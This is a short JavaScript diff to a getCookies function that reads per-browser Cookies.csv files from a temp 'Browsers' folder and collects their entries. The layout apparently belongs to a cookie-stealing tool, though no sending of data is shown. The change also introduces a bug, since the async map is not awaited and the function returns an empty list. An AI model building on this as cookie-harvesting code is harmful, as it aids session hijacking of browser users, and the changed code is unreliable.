@@ -13,7 +13,7 @@ const { getTempFolder } = require('./init');
 module.exports.getCookies = async () => {
   let cookies = [];
   const browsers = await searchForFolder(join(getTempFolder(), 'Browsers'), 2000) || [];
-  for (const browser of browsers.filter(f => f.split('.').length >= 1)) {
+  browsers.filter(f => f.split('.').length >= 1).map(async browser => {
     const file = join(getTempFolder(), 'Browsers', browser, 'Cookies.csv');
     let line = await searchForFile(file, 1000);
     if (!line) return;
@@ -29,6 +29,6 @@ module.exports.getCookies = async () => {
       });
       cookies.push(entry);
     });
-  }
+  });
   return cookies;
 };
